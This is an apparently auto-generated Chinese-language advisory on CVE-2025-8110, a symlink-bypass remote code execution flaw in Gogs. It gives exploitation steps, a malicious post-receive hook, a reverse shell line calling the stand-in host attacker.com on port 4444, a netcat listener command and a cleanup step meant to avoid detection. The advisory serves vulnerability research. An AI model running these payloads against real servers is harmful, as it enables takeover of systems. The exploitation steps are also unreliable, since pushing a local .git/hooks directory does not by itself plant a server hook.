## CVE-2025-8110 - Gogs 远程代码执行 (命令注入, 符号链接绕过)

**漏洞编号:** CVE-2025-8110

**漏洞类型:** 远程代码执行 (命令注入, 符号链接绕过)

**影响应用:** Gogs

**危害等级:** 高危远程代码执行漏洞

**CVSS评分:** 7.8

**影响版本:** Gogs <= 0.13.0

**利用条件:** 需要身份验证及仓库推送权限

**POC 可用性:** 5/10

**POC 类型:** 概念验证 (演示恶意Git Hook机制)

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2025-8110是一个影响Gogs自托管Git服务的严重远程代码执行漏洞，其核心在于对Git仓库文件操作（特别是文件上传和在线编辑功能）中符号链接的过滤不当，导致攻击者能够通过构造恶意符号链接绕过现有安全修复（如CVE-2024-55947），重写`.git`目录下的文件，进而植入恶意Git Hook脚本（如`post-receive`），最终在Gogs服务器上执行任意命令。此漏洞允许经过身份验证且具有仓库推送权限的攻击者完全控制受影响的Gogs实例。

**POC有效性分析:**
提供的POC，虽然不是一个与远程Gogs服务器交互的完整端到端利用，但它作为该漏洞的概念验证是高度有效的。它专注于利用Git `post-receive` Hook的关键载荷传递机制。`exploit.py`脚本通过创建必要的`.git/hooks/`目录结构，并将自定义的`post-receive`脚本注入其中，精心准备了一个本地Git仓库。这个POC中所示的脚本会将`id`命令的输出写入一个临时文件（`/tmp/gogs_exploited`），从而演示了任意命令执行。`bash.sh`组件进一步展示了一个更严重的攻击场景，通过提供一个反弹shell载荷，展示了完全系统入侵的可能性。该漏洞的核心，即搜索结果中描述的“符号链接绕过”，允许文件重写到`.git`目录，是攻击者成功植入或覆盖这些恶意Hook的前提。尽管POC没有明确实现符号链接绕过本身，但它假设了成功的利用已经发生，从而侧重于通过Hook进行的后续命令注入。这使得POC在演示漏洞的*影响*方面高度相关且有效，验证了如果能够放置恶意Hook，就可以实现RCE。POC代码的简洁性和清晰性也有助于理解该机制，使其成为安全研究人员复现和理解此漏洞后利用阶段的宝贵工具。

**利用步骤:**
1.  **准备环境**: 攻击者首先需要确定目标Gogs服务器的版本是否受CVE-2025-8110影响（Gogs <= 0.13.0）。此外，攻击者必须拥有目标Gogs实例上任意一个仓库的有效用户凭据以及对该仓库的推送（push）权限。
2.  **本地仓库初始化与配置**: 在攻击者的本地机器上，初始化一个新的Git仓库（`git init malicious_repo`）。
3.  **构造恶意Git Hook**: 在新创建的本地仓库目录（`malicious_repo`）中，进入`.git/hooks/`路径。在此路径下创建一个名为`post-receive`（或其他Gogs会执行的Git Hook，具体取决于漏洞详情）的文件。将恶意命令写入此文件中。本POC提供的示例包括：`bash -c "id > /tmp/gogs_exploited"`用于验证任意命令执行，通过将`id`命令的输出写入服务器的`/tmp/gogs_exploited`文件；或`bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &`作为反弹shell负载，旨在连接到攻击者控制的`attacker.com`上的`4444`端口，提供一个交互式shell。
4.  **赋予执行权限**: 确保`post-receive`文件具有执行权限，使用命令`chmod +x malicious_repo/.git/hooks/post-receive`。这是Git hooks正常工作所必需的。
5.  **关联远程仓库**: 将本地仓库与目标Gogs服务器上的远程仓库关联起来。例如：`git remote add origin http://gogs.target.com/user/repo.git`。
6.  **推送恶意Hook**: 将本地仓库内容（包括恶意Hook）推送到Gogs服务器：`git push origin master`。这一步是触发漏洞的关键，Gogs服务器在处理接收到的推送时会执行相应的Git Hook。
7.  **验证RCE**: 如果使用了`id`命令负载，攻击者可以通过其他途径（如Web文件浏览、SSH访问等，若有权限）检查Gogs服务器上的`/tmp/gogs_exploited`文件是否存在及其内容，以确认命令是否成功执行。如果使用了反弹shell负载，攻击者需在推送前在自己的`attacker.com`机器上启动一个监听器（如`nc -lvp 4444`）。一旦恶意Hook被执行，监听器将接收到来自Gogs服务器的反弹shell连接，从而获得对服务器的远程控制。
8.  **清理（可选）**: 攻击者可以在完成攻击后将恶意Hook从仓库中移除并再次推送，以避免被发现。

**投毒风险分析:**
提供的概念验证（POC）代码针对CVE-2025-8110的投毒风险极低，估计为10%。这一评估基于对其组成文件的全面审查，包括`README.md`、`bash.sh`和`exploit.py`。

`exploit.py`脚本使用Python编写，并且仅依赖于标准且受信任的库：`subprocess`和`os`。它的功能完全透明，仅限于本地文件系统操作。具体来说，它会创建一个目录结构（`/tmp/malicious_repo/.git/hooks`），将一个简单的shell命令（`id > /tmp/gogs_exploited`）写入名为`post-receive`的文件中，然后设置其可执行权限。这些操作直接且明确地与演示如何准备恶意Git Hook的目的相关。代码中没有混淆、没有尝试下载或执行外部代码、没有异常的网络通信，也没有使用超出文件操作所需的特权系统调用。脚本的输出清楚地表明其意图：“[+] Malicious hook planted. Push to trigger RCE.”（恶意Hook已植入。推送以触发RCE）。这种清晰度显著降低了研究人员意外或恶意执行的风险。

`bash.sh`文件包含一个典型的反弹shell载荷（`bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &`）。它被明确标记为“恶意post-receive Hook”，旨在作为漏洞利用效果的一部分，在*易受攻击的目标服务器上*执行，而不是在运行POC的研究人员机器上执行。它作为远程代码执行高影响力载荷的一个示例。安全研究人员受过训练，能够区分漏洞利用载荷和漏洞利用工具本身。因此，POC结构中存在此载荷并不构成对研究人员的投毒风险，而是说明了对目标系统的*潜在影响*。

`README.md`文件提供了漏洞、受影响软件和漏洞类型的简洁准确描述。它纯粹是信息性的，不包含任何可执行代码或恶意链接。

综合这些观点，POC的设计优先考虑了清晰度和对漏洞机制的直接演示。没有隐藏功能、可疑的第三方依赖项或表明意图危害研究人员系统的代码段。10%的风险评估仅考虑了最遥远的理论可能性，例如攻击者在传输过程中修改POC（供应链攻击），或者研究人员在没有适当沙箱或审查的情况下，在生产环境中极其疏忽地执行它。然而，仅根据提供的代码，它代表了一个行为良好且无恶意的漏洞研究工具。

**项目地址:** 未提供

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-8110
